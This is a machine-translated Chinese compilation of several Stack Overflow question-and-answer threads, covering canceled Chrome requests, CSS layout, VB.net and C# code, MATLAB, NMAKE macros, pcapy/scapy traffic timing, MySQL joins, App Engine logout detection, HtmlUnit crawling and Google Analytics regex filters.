当我在样式表中嵌入网络字体时，我嵌入了所有类型的字体以及**woff**、**woff2**、**ttf 。**最近我注意到 Chrome在**woff2**存在时取消了对**ttf**和**woff的请求。**我现在使用 Chrome 版本 66.0.3359.181，但我不确定 Chrome 何时开始取消额外的字体类型。

 *** * *

## 回答 #16

> 赞同：2
> 
> 时间：2018-12-06T10:05:25.323

我们在表单中有标签时遇到了这个问题`<button>`，它应该从 js 发送 ajax 请求。但是这个请求被取消了，因为浏览器会在表单内的任何点击时自动发送`button`表单。

因此，如果您真的想使用`button` 而不是常规`div`或`span`在页面上使用，并且想要发送表单 throw js - 您应该设置一个带有`preventDefault`函数的侦听器。

例如

```
$('button').on('click', function(e){

    e.preventDefault();

    //do ajax
    $.ajax({

     ...
    });

}) 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2017-03-28T07:28:40.577

我遇到了同样的问题，在我们的代码深处，我们有这个伪代码：

*   创建一个 iframe
*   加载 iframe 提交表单

*   2 秒后，移除 iframe

因此，当服务器响应时间超过 2 秒时，服务器正在写入响应的 iframe 被删除，但响应仍要写入，但没有 iframe 可写入，因此 chrome 取消了请求，因此为避免这种情况，我确保仅在响应结束后才删除 iframe，或者您可以将目标更改为“_blank”。因此，原因之一是： **当您正在写入内容的资源（在我的情况下为 iframe）在您停止写入之前被删除或删除时，请求将被取消**

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2019-11-22T23:13:47.697

如果您使用一些基于 Observable 的 HTTP 请求，例如 Angular (2+) 中内置的那些，那么 HTTP 请求可以在 observable 被取消时被取消（当您使用 RxJS 6`switchMap`运算符组合流时很常见） . `mergeMap`在大多数情况下，如果您希望请求完成，则使用运算符就足够了。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2013-04-24T10:59:32.220

我有两个 CSS 文件完全相同的东西，它们存储在我的主 css 文件夹之外的另一个文件夹中。我正在使用表达式引擎，发现问题出在我的 htaccess 文件中的规则中。我刚刚将该文件夹添加到我的条件之一中并修复了它。这是一个例子：

```
RewriteCond %{REQUEST_URI} !(images|css|js|new_folder|favicon.ico) 
```

因此，检查 htaccess 文件是否有任何潜在冲突可能是值得的

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2013-08-13T18:48:38.310

打电话给我时也发生了同样的事情。带有 $.js 的文件。ajax，并发出ajax请求，我所做的就是正常调用。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2014-05-19T05:32:13.867

在我的情况下，显示电子邮件客户端窗口的代码导致 Chrome 停止加载图像：

```
document.location.href = mailToLink; 
```

将其移至 $(window).load(function () {...}) 而不是 $(function () {...}) 会有所帮助。

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2014-06-09T09:28:18.550

这可以帮助我在遗漏返回错误时遇到取消状态的任何人；在表单中提交。这导致 ajax 发送紧跟在提交操作之后，该操作覆盖了当前页面。代码如下所示，最后是重要的 return false。

```
$('form').submit(function() {

    $.validator.unobtrusive.parse($('form'));
    var data = $('form').serialize();
    data.__RequestVerificationToken = $('input[name=__RequestVerificationToken]').val();

    if ($('form').valid()) {
        $.ajax({
            url: this.action,
            type: 'POST',
            data: data,
            success: submitSuccess,
            fail: submitFailed
        });
    }
    return false;       //needed to stop default form submit action
}); 
```

希望对某人有所帮助。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2020-07-15T20:40:21.773

就我而言，问题的原因是另一个。

我的应用程序位于代理后面，Chrome 请求使用[If-Modified-Since HTTP 标头](https://stackoverflow.com/questions/12009423/what-does-status-canceled-for-a-resource-mean-in-chrome-developer-tools?page=2&tab=votes#tab-top)发送。当此标头存在时，预期的行为是：

> 服务器将返回请求的资源，状态为 200，仅当它在给定日期之后最后一次修改时。如果此后请求没有被修改，则响应将是没有任何正文的 304；

Proxy 未能满足此预期，响应为 304 状态代码但正文非空，从而导致请求被取消。

修复代理行为请求后，就像一个魅力。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2018-02-10T17:56:08.777

对我来说，“取消”状态是因为该文件不存在。奇怪为什么 chrome 不显示`404`。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2018-10-03T07:11:40.497

对我来说，这就像一条错误的道路一样简单。我建议调试的第一步是查看是否可以独立于 ajax 等加载文件。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2021-02-05T09:21:35.707

我的内容安全策略标头！您可以通过检查 Chrome 开发工具控制台快速排除这种可能性，如果是 CSP 问题，控制台中会显示错误。在 .Net 中，您可以通过在 web.config 文件或代码中添加标头来解决此问题。

> 拒绝将表单数据发送到“https://www.mysite.mydomain/”，因为它违反了以下内容安全政策指令：“form-action 'self' *.otherdomain www.thirdparty.co.uk”。

这是针对上述错误的 web.config 修复：

```
<cspConfiguration>
        <directives>
            <directive name="form-action" allowedSources="'self' *.mydomain>
            </directive>
        </directives>
</cspConfiguration>
```

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2016-04-05T22:49:13.273

对于来自 LoopbackJS 并尝试使用其图表示例中提供的自定义流方法的任何人。我在使用 时遇到此错误`PersistedModel`，切换到基本`Model`解决了我的`eventsource`状态取消问题。

同样，这是专门针对回送 api 的。而且由于这是谷歌的最佳答案和顶级答案，我想我会把它放在答案的组合中。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2019-02-21T21:33:38.200

请求可能已被跟踪保护插件阻止。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2019-03-18T20:51:01.617

加载 300 张图像作为背景图像时发生在我身上。我猜一旦第一个超时，它就会取消所有其余的，或者达到最大并发请求。需要执行一次 5 个

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2020-05-12T07:05:24.407

我在`a`标签内有一个`div`标签。`div`had`onclick="location='http://mydestination.org/'"`和`a`tag 在`href`. 这导致目标页面被加载两次，第一次加载被 Chrome 取消。

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2019-08-06T18:43:43.367

就我而言，它是在 chrome 76 更新之后开始出现的。

由于我的 JS 代码中的一些问题，window.location 被多次更新，导致取消之前的请求。虽然之前就存在这个问题，但 chrome 在更新到版本 76 后开始取消请求。

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2019-06-26T05:47:11.860

原因之一可能是在代码中的某处调用了[XMLHttpRequest.abort()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/abort)，在这种情况下，请求将具有`cancelled`Chrome 开发人员工具网络选项卡中的状态。

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2021-03-25T08:48:21.847

从严格的角度来看 Angular ：

当您无法在代码级别正确中断时，就会发生这种情况。

假设request1出去了，它的response也来了，然后嵌套的request2也出去了，它的response也来了，直接跳出循环，没有正确破坏request1的订阅，

那时，它发生了

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2019-10-24T11:01:04.433

更新记录时我遇到了同样的问题。在 save() 内部，我正在准备从表单中获取的原始数据以匹配数据库格式（对枚举值进行大量映射等），这会间歇性地取消 put 请求。我通过从 save() 中取出数据准备并从中创建一个专用的 dataPrep() 方法来解决它。我把这个 dataPrep 变成了 async 并等待所有的内存密集型数据转换。然后我将准备好的数据返回给我可以在 http put 客户端中使用的 save() 方法。在调用 put 方法之前，我确保在 dataPrep() 上等待：

等待数据更新 = 等待数据准备（）；http.put(apiUrl, dataToUpdate);

这解决了请求的间歇性取消。**

# css - 大卡特尔网站滚动过多。有人可以帮我处理css吗？

> ID：12009425
> 
> 赞同：0
> 
> 时间：2012-08-17T16:18:09.897
> 
> 标签：css, bigcartel

该站点[http://doomedfromdayonemerch.bigcartel.com/](http://doomedfromdayonemerch.bigcartel.com/)当前在页面下方滚动太多，这是因为页脚（隐藏）位于页面底部。即使我使用 CSS 移动页脚，页面仍然滚动相同的量。理想情况下希望它只向下滚动一点。我确实有溢出-y：隐藏在身体上，虽然这确实有效，但它不允许更小的屏幕/放大，因为你根本无法滚动。任何帮助都会很棒！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:25:24.313

在您的**CSS**代码中添加

```
html{
    height:100%
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:28:01.660

问题不在于页脚。

问题在于您的 div id="navigation"

我做了一些与将页脚粘贴到页面底部有关的问题。看看他们，也许会对你有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:31:37.347

我知道已经选择了一个答案，但让我进一步解释一下。您将导航 div 定位为相对，而不是绝对。看起来您正在尝试使用绝对定位，因为我在导航 css 中看到了 z-index。要使用绝对定位，父元素需要设置为 position: relative; 并且您想要绝对的元素需要设置为 position: absolute;

添加相对于#wrap的位置

```
#wrap {
width: 740px;
height: 700px;
margin: 0 auto;
padding: 5px;
text-align: left;
position: relative;
} 
```

并将导航更改为绝对

```
#navigation {
z-index: 99;
position: absolute;
top: 175px;
padding-top: 10px;
padding-right: 5px;
margin-right: 4px;
height: 442px;
background: rgba(228, 228, 228, 0);
clear: both;
border-bottom-right-radius: 10px;
right: 10px;
} 
```

# vb.net - 如何打印此数据网格视图？

> ID：12009432
> 
> 赞同：0
> 
> 时间：2012-08-17T16:18:43.733
> 
> 标签：vb.net, datagrid, datagridview

如果您使用过 Winforms Data Grid，那么您就会知道它们很有用，但在打印它们时会很痛苦，因为这些功能非常有限。出于这个原因，许多人编写了自己的打印数据网格的类。

我不知道 VB.net，所以我不确定如何“创建”一个类的实例以将我的数据网格传递给我在 pastebin 上列出的代码。我正在寻找使用 pastebin 代码打印数据网格，但我不知道我必须在代码中编写什么来传递我的数据网格进行打印。对于此示例，假设 DataGrid 的名称是“dgvName”

[http://pastebin.com/12jvMLqR](http://pastebin.com/12jvMLqR)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:27:45.623

它是一个共享方法，与 c# 中的静态方法相同，因此只需将您的 DataGridView 作为参数传递：

```
Call PrintDGV.Print_DataGridView(dgvName) 
```

# matlab - 将结构数组转换为字符串数组，包括结构的属性之一

> ID：12009437
> 
> 赞同：1
> 
> 时间：2012-08-17T16:18:53.160
> 
> 标签：matlab, matlab-guide

我有一个结构数组`Imgs`，它包括每个结构内图像文件的以下属性。

```
name
date
byte
isdir
datenum 
```

现在我想创建一个新的字符串数组`img_names`，其中包含上述结构数组的唯一名称。我真的是一个关于matlab的新手，我不知道该怎么做。

所以我想有一个像那个结构一样的数组。

```
img_names[1] = 'file-1.jpg'

img_names[2] = 'file-2.jpg'

img_names[3] = 'file-3.jpg'

... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:27:09.917

```
>> img_names=sprintf('%s\n',Imgs.name); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:34:14.560

```
img_names = arrayfun(@(x) x.name,Imgs,'uni',false) 
```

生成一个包含名称的元胞数组。然后，您可以使用以下方式访问每个名称：

```
img_names{1}
img_names{2}
% ... 
```

# c# - 检查多个 isValid 语句的更紧凑的方法

> ID：12009438
> 
> 赞同：0
> 
> 时间：2012-08-17T16:18:56.150
> 
> 标签：c#, .net, extension-methods

我有许多执行验证的方法——tryParse 是我使用的主要功能之一。

我最终得到这样的代码：

```
bool isValid = true;

int dealId;
isValid = !int.TryParse(strArr[0], out dealId) ? false : isValid;

DateTime createdOn;
isValid = !DateTime.TryParse(strArr[1], out createdOn) ? false : isValid;

isValid = !tmp.Add(new BookmarkedDeal(userId, dealId, createdOn)) ? false : isValid; 
```

只有当结果为假时，是否有更好的方法将 isValid 设置为 false？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:25:50.140

这取决于您对“更好”的定义，但您可以执行以下操作：

```
int dealId;
DateTime createdOn;

return int.TryParse(strArr[0], out dealId) &&
       DateTime.TryParse(strArr[1], out createdOn) && 
       tmp.Add(new BookmarkedDeal(userId, dealId, createdOn)) 
```

（当然假设您是从方法中返回 this，否则，您可以将 this 的值设置为 a`bool isValid`并像以前一样使用它）

`&&`称为条件与运算符。基本思想是它只会评估足够远以查看返回值是否满足条件。因此，首先它会检查是否`int.TryParse()`返回 true，如果返回 true，它将检查`DateTime.TryParse()`，然后如果返回 true，则执行以下方法。这个运算符的美妙之处在于，如果有任何失败，那么它知道它不可能为真并立即返回一个假。

（还有一个条件或运算符 ( `||`) 的作用相同，但 if 的计算结果仅足够公平，直到它达到 a `true`，因此使整个表达式为真）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:25:51.707

## 短路评估：

```
int dealId;
DateTime createdOn;

bool isValid = int.TryParse(strArr[0], out dealId)
               &&
               DateTime.TryParse(strArr[1], out createdOn)
               &&
               tmp.Add(new BookmarkedDeal(userId, dealId, createdOn)); 
```

（在上面的语句中，一旦一个术语评估为假，即停止评估）

此外，您可以订购验证，以便最有可能失败的事情首先出现......然后您可以通过不探索其他路径来更快地执行验证。（过早优化的一个很好的例子......但如果每个术语都可能需要一段时间才能执行，那么值得牢记）。

==================================================== ===============================

两种替代方法，评估每个术语并记录 isValid=false 如果任何评估为假。

## 使用逻辑与 (&&)：

（将“&& isValid”放在表达式的右侧很重要，以避免在前一个 isValid 为 false 时发生短路）。

```
int dealId;
DateTime createdOn;

bool isValid = int.TryParse(strArr[0], out dealId);
isValid = DateTime.TryParse(strArr[1], out createdOn) && isValid;
isValid = tmp.Add(new BookmarkedDeal(userId, dealId, createdOn)) && isValid; 
```

## 使用按位与 (&)：

```
int dealId;
DateTime createdOn;

bool isValid = int.TryParse(strArr[0], out dealId)
               &
               DateTime.TryParse(strArr[1], out createdOn)
               &
               tmp.Add(new BookmarkedDeal(userId, dealId, createdOn)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:27:10.803

这个怎么样：

```
int dealId;
DateTime createdOn;
bool isValid = int.TryParse(strArr[0], out dealId) && 
     DateTime.TryParse(strArr[1], out createdOn) && 
     tmp.Add(new BookmarkedDeal(userId, dealId, createdOn) 
```

由于 && 是从左到右执行的，从前一次调用中检索到的变量将为下一次调用做好准备。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-17T16:42:51.930

这是您可以接近的另一种方法。我不确定传递参数的开销会给系统带来什么开销，那么如果它出错，为什么不直接捕获它呢？

```
bool isValid;
try
{ 
   int dealID = int.Parse(strArr[0]);
   DateTime createdOn = DateTime.Parse(strArry[1]);
   tmp.Add(new BookmarkedDeal(userId, dealId, createdOn);
   isValid = true;
}
catch
{
   isValid = false;
} 
```

# nmake - 微软 nmake：$？扩展但 $< 没有

> ID：12009439
> 
> 赞同：1
> 
> 时间：2012-08-17T16:18:59.210
> 
> 标签：nmake

我正在尝试编译一些第三方代码并遇到了一些奇怪的 NMAKE 行为。

Makefile 中的行是

```
cholmod_aat.o: ../Core/cholmod_aat.c
        $(C) -c $(I) $< -Fo$@ 
```

这会产生以下错误：

```
 Wed, Aug 15 2012 23:25:20           ../Include/cholmod.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_blas.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_check.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_cholesky.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_complexity.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_config.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_core.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_internal.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_matrixops.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_modify.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_partition.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_supernodal.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_template.h
Fri, Aug 17 2012 16:06:24           ../Core/cholmod_aat.c
                                  cholmod_aat.o target does not exist
NMAKE : warning U4006: special macro undefined : '$<'
        cl -O2 -nologo -D__MINGW32__ /MD -DNPARTITION -c -I../../AMD/Include -I.
./../AMD/Source -I../../COLAMD/Include  -I../../metis-4.0/Lib -I../../CCOLAMD/In
clude -I../../CAMD/Include  -I../Include -I../../UFconfig  -Focholmod_aat.o
cl : Command line error D8003 : missing source filename
NMAKE : fatal error U1077: '"c:\Program Files (x86)\Microsoft Visual Studio 10.0
\VC\BIN\cl.EXE"' : return code '0x2'
Stop. 
```

为什么 nmake 事先将 cholmod_aat.c 列为依赖项时说 '$<' 是“未定义的”？更令人困惑的是，如果我将 $< 替换为 $? 在 makefile 中，nmake 扩展 '$?' 正好：

```
 Wed, Aug 15 2012 23:25:20           ../Include/cholmod.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_blas.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_check.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_cholesky.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_complexity.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_config.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_core.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_internal.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_matrixops.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_modify.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_partition.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_supernodal.h
Wed, Aug 15 2012 23:25:20           ../Include/cholmod_template.h
Fri, Aug 17 2012 16:06:24           ../Core/cholmod_aat.c
                                  cholmod_aat.o target does not exist
        cl -O2 -nologo -D_*MINGW32*_ /MD -DNPARTITION -c -I../../AMD/Include -I.
./../AMD/Source -I../../COLAMD/Include  -I../../metis-4.0/Lib -I../../CCOLAMD/In
clude -I../../CAMD/Include  -I../Include -I../../UFconfig ../Include/cholmod.h .
./Include/cholmod_blas.h ../Include/cholmod_check.h ../Include/cholmod_cholesky.
h ../Include/cholmod_complexity.h ../Include/cholmod_config.h ../Include/cholmod
_core.h ../Include/cholmod_internal.h ../Include/cholmod_matrixops.h ../Include/
cholmod_modify.h ../Include/cholmod_partition.h ../Include/cholmod_supernodal.h
../Include/cholmod_template.h ../Core/cholmod_aat.c -Focholmod_aat.o 
```

到底是怎么回事？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-28T12:49:35.710

答案在[MSDN](http://msdn.microsoft.com/en-us/library/cbes8ded.aspx "文件名宏")上：

> $< - 时间戳晚于当前目标的依赖文件。仅在推理规则中的命令中有效。

它不在“推理规则”中，而是在“描述块”中，因为这些东西在 NMAKE 中被调用。

---**编辑：**扩展我原来的答案---

术语有点奇怪，所以在这种情况下，最容易通过示例来展示。我创建了一个包含 2 个规则的 makefile - 一个描述块（又名目标规则）和一个推理规则。

```
C:\temp>type makefile.txt
c.txt : a.txt b.txt
        @echo $?
        @echo %s

.SUFFIXES: .log

.log.txt:
        @echo $< 
```

我为虚拟输入创建了空文件 a.txt、b.txt 和 d.log。然后我在目标 c.txt 和 d.txt 上运行 makefile：

```
C:\temp>nmake /f makefile.txt c.txt d.txt

Microsoft (R) Program Maintenance Utility Version 12.00.21005.1
Copyright (C) Microsoft Corporation.  All rights reserved.

a.txt b.txt
a.txt
d.log

C:\temp> 
```

希望这能说明 $?、%s 和 $< 之间的区别。MSDN 文档相当简洁，但代码确实按文档说明工作。诚实的！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-05T06:05:46.267

您可以尝试以下方法：

```
cholmod_aat.obj: ../Core/cholmod_aat.c
        $(C) -c $(I) %s -Fo$@ 
```

符号 %s 映射到列表中的第一个依赖项

# python - 使用 pcapy 或 scapy 监控自生成 (HTTP) 网络流量

> ID：12009442
> 
> 赞同：3
> 
> 时间：2012-08-17T16:19:07.197
> 
> 标签：python, networking, network-programming, pcap, scapy

我需要监控某个网站在处理时需要多长时间才能做出响应。我想嗅探端口 80 上的流量，但仅在与目标站点交换流量时。我已经搜索过，似乎 pcapy 或 scapy 是适合这项工作的工具，但它们似乎比我需要的更深。我正在研究以下脚本：

[在 python 中使用 pcapy 监控网络流量](https://stackoverflow.com/questions/8148608/network-traffic-monitor-with-pcapy-in-python)

我想我需要改变

```
def __handle_packet(self, header, data):
    # method is called for each packet by dispatch call (pcapy)
    self._dispatch_bytes_sum += header.getlen() #header.getlen() #len(data)
    logger.debug("header: (len:{0}, caplen:{1}, ts:{2}), d:{3}".format(header.getlen(), header.getcaplen(), header.getts(), len(data)))
    #self.dumper.dump(header, data) 
```

以某种方式仅解包/处理发往目标站点的数据包。请注意，这适用于 LAN 上的 Windows XP 机器，浏览器启动流量至关重要。

任何指针表示赞赏？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:26:24.203

scapy 的问题在于它不能处理重新组装[TCP 流](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CGEQFjAA&url=http://trac.secdev.org/scapy/wiki/TCP&ei=rW8uUPmGHM7siQLziYHQCQ&usg=AFQjCNE1efwj3oGERwtPS4O88mi2uquAhQ&sig2=XvFR0i4Et0M28EeEG3-9Qg)。您正在寻找的 HTTP 可能嵌入在 TCP 流中。引用文档：

> Scapy 基于刺激/响应模型。此模型不适用于 TCP 堆栈。另一方面，TCP 流经常被用作交换基于刺激/响应的消息的管道。

就像你说的 scapy 更适合低层的东西。例如，您可以跟踪 DHCP 请求的 IP 数据包。与许多网络工具一样，TCP 的复杂性和基于流的性质意味着，一旦您跨过该层，就很难重新组装所有内容并处理所有重传以及边缘情况以及连贯地提取数据。

你可以使用 curl 或 urllib 之类的东西，看看响应回来需要多长时间？

# mysql - mysql复杂选择，左连接

> ID：12009446
> 
> 赞同：0
> 
> 时间：2012-08-17T16:19:25.123
> 
> 标签：mysql, left-join

我有 3 张桌子，a，b，c

可以为两个表添加左连接选择通过左连接添加第三个表：

例子：

```
SELECT * from a,b where  a.x=b.x and a.z=b.z and b.y>0 
```

（我只需要选择那些我可以通过该规则找到完全匹配的记录）

现在我想从第三张表中添加一些字段，但有可能出现第三张表可能不包含某些表 a、b 记录的数据。据我了解，我可以使用左连接？

我如何选择这样的东西：

```
SELECT a.*,b.*, c.Q from a,b where  a.x=b.x and a.z=b.z and b.y>0  left join c on a.x=c.x 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:26:44.297

如果您不喜欢编写 INNER JOIN：

```
SELECT a.*,b.*, c.Q 
FROM (a,b)  
LEFT JOIN c 
ON a.x=c.x 
WHERE a.x=b.x and a.z=b.z and b.y>0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:23:02.143

```
SELECT a.*,b.*, c.Q 
FROM a 
INNER JOIN b 
  ON a.x=b.x AND a.z=b.z AND b.y>0
LEFT JOIN c 
  ON a.x=c.x 
```

# google-app-engine - 如何确定用户是否在另一个页面上注销

> ID：12009453
> 
> 赞同：0
> 
> 时间：2012-08-17T16:19:44.700
> 
> 标签：google-app-engine

我正在运行一个 Google App Engine 项目，每次用户执行操作时，我都想检查用户是否 1）登录 2）管理员。这是我为 appuser 提供的代码：

```
class AppUser 
{
    private UserService userService;
    private User user;

    public AppUser()
    {
        userService = UserServiceFactory.getUserService();
        user = userService.getCurrentUser();
    }

    public IsAdministrator()
    {
        if(IsLoggedIn())
        {
            return userService.IsUserAdmin();
        }
        return false;
    }

    public IsLoggedIn()
    {
        return user == null;
    }
} 
```

当我使用我的应用程序注销时，它工作正常。但是，如果我在另一个页面上注销（例如在谷歌日历或其他页面上），应用程序仍然认为我已登录。还有其他更好的方法来检查用户是否仍然登录？

我也知道这可以通过 web.xml 中的 security-constraint 来完成，但是在这种情况下这将不起作用，因为如果用户已注销，我需要采取某些措施。

我正在使用 App Engine SDK 1.7 和 GWT SDK 2.4

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T19:49:53.410

通知应用程序有关用户注销的两种方法：

1.  同步 - 服务器主动通知客户端（浏览器）注销。使用[Channels API](https://developers.google.com/appengine/docs/java/channel/overview)向客户端发送推送通知。有一个[GWT 包装器](https://github.com/eirikb/gwt-channel-api)。

2.  异步 - 当客户端与服务器通信时，服务器会通知客户端注销，即在每个 RPC 调用中添加身份验证检查。如果用户 id 注销，则引发异常，[可由 GWT 处理](https://developers.google.com/web-toolkit/doc/latest/tutorial/RPC#exceptions)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-03T15:42:38.870

我今天遇到了这个问题，尽管情况更糟：我以用户 A 的身份（从 Google 站点页面）注销，并以用户 B 的身份登录，但我的 GAE 应用程序仍然认为我以用户 A.Argh 的身份登录。

这样做的原因是涉及到两个 cookie，一个用于跟踪哪个 Google 用户登录到 Google，另一个用于跟踪哪个 GAE 应用程序用户登录到我的 GAE 应用程序。回想一下，GAE 可以使用任何联合身份验证服务，而不仅仅是 Google 的。我的应用程序无法访问 google.com cookie，因此我无法直接检查用户 A 是否仍在登录（或当前登录的用户）。

不幸的是，我还没有找到一个直接的“联合注销”机制，尽管[Google Identity Toolkit](https://developers.google.com/identity-toolkit/)有可能用于检测预期用户不再登录。

我发现其他人在讨论这个问题：

*   [如何在不同的浏览器页面管理多个账户的登录和注销？](https://stackoverflow.com/questions/2360682/how-to-manage-multiple-accounts-login-and-logout-in-different-browser-pages)
*   [UserService 在注销后检索到错误的用户](https://stackoverflow.com/questions/6015517/userservice-retrieves-wrong-user-after-logout)

**更新**

我想出了一个适用于我的应用程序的解决方案，我有一个页面可以将用户（学生）重定向到他或她的课堂主页。由于任何一个学生（每天几次）都很少访问它，但需要知道哪个学生登录，我采用了以下对我有用的方法：

1.  用户转到页面 A，该页面清除了 ACSID 和 SACSID cookie，并重定向到 Google 以供用户登录。
2.  用户可能已经登录，因此谷歌（有几个重定向）将 ACSID 和 SACSID cookie 更新为当前登录的用户，并在页面 B 处重定向回我的应用程序。
3.  页面 B 最终代表已登录的用户采取行动，“确信”正确的用户已登录（在页面确信的范围内）。;-)

这是该方法的代码草图：

```
# My BaseHandler has a clear_cookie
class LoginAndRedirectHandler(base_handler.BaseHandler):
  def get(self):
    self.clear_cookie('ACSID')
    self.clear_cookie('SACSID')
    self.clear_cookie('dev_appserver_login')

    if 'continue' in self.request.params and \
       self.request.params['continue'].startswith('/'):
      url = self.request.params['continue']
    else:
      # Whatever your page is that needs an up to date logged in user
      url = users.create_login_url('/PageB')

    if isinstance(url, unicode):
      url = url.encode('utf8')
    logging.info('Redirecting to ' + url)
    self.redirect(url)
    return 
```

*我在上面不经常*说的原因是这个过程在时间上很昂贵，至少涉及 4 或 5 个重定向。

# java - htmlUnit 行为异常。我无法检索正确数量的锚标签或链接标签？

> ID：12009455
> 
> 赞同：0
> 
> 时间：2012-08-17T16:19:51.407
> 
> 标签：java, jakarta-ee, web-crawler, htmlunit

我正在使用 HtmlUnit 2.10。我正在为网站创建一个小型链接验证器。对于爬行，我正在使用它。在我的研究期间，我试图爬行：`loans.xxxxxxx.com`。它有 58 个锚标签和 5 个链接标签。

我正在写这样的代码

```
 List<HtmlElement> elementsOfPage = (List<HtmlElement>) htmlPage.getElementsByTagName("link");
    Iterator<HtmlElement> it = elementsOfPage.iterator();
    System.out.println(elementsOfPage.size());
    while(it.hasNext()) {
        HtmlElement htmlElement = it.next();
        System.out.println(htmlElement.toString());
    } 
```

我也对锚标记执行相同的程序，即对于链接，它只显示 3，而对于锚，它只显示 56，即使分别有 5 个和 58 个。

代码中有一些被注释的部分，我认为 Web 客户端会忽略它，但如果你实际打印它会显示一些结果实际上来自注释代码。

// 在运行 webclient 之前，我禁用了 applet、css、javascripts 并将超时时间增加到 7 秒。

为什么这种行为很奇怪？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T14:56:41.523

58 和 5 这样的数字是怎么得到的？我试图检查您使用 HtmlUnit 2.10 + JSoup 解析器提供的 URL。代码是（Groovy，但几乎是 Java）：

```
def client = new WebClient(BrowserVersion.FIREFOX_3_6)
client.setThrowExceptionOnScriptError(false);
def page = (HtmlPage)client.getPage("http://loans.bankofamerica.com/en/index.html")
def doc = Jsoup.parse(page.asXml())
println doc.select("a").size()
println doc.select("link").size() 
```

结果是 56 和 2。但使用默认 UserAgent

```
def client = new WebClient() 
```

结果是 56 和 3！似乎服务器给出不同的标记取决于用户代理字符串（可能还有其他标头）。

# regex - Google Analytics 过滤没有扩展名的页面

> ID：12009457
> 
> 赞同：1
> 
> 时间：2012-08-17T16:19:54.433
> 
> 标签：regex, filter, google-analytics

我的网站中有许多页面通过扩展响应。我希望能够在报告中只包含没有`.php`扩展名的页面，但所有其他页面（喜欢`.html, .cfm, .aspx`或根本没有扩展名）。我怎样才能做到这一点？

我已经尝试创建一个过滤器，但被困在构建正则表达式的正确方法上。我创建了下面的代码，但它没有过滤掉没有`.php`扩展名的页面。

```
(.*(?!(\.)php))$ 
```

这段代码有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:43:45.960

您的高级过滤器或高级细分应该如下所示。![这](../Images/ce8cb2ae54233b8debe365f07072adee.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:44:21.553

您的代码使用负前瞻。Google Analytics 不支持此正则表达式功能。

这可能会令人困惑，因为前段时间这会起作用。在某些时候，谷歌删除了负面预测，但从未得到官方支持。

在此处查找 Google Analytics 中支持的 REGEX 功能列表：

[http://support.google.com/analytics/bin/answer.py?hl=en&answer=1034324](http://support.google.com/analytics/bin/answer.py?hl=en&answer=1034324)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:25:10.657

如何使用“仅包含”过滤器而不是“排除”？

# castle-windsor - Castle Windsor WCF 集成 - DefaultServiceHostFactory、内核等

> ID：12009458
> 
> 赞同：0
> 
> 时间：2012-08-17T16:19:55.510
> 
> 标签：castle-windsor, castle

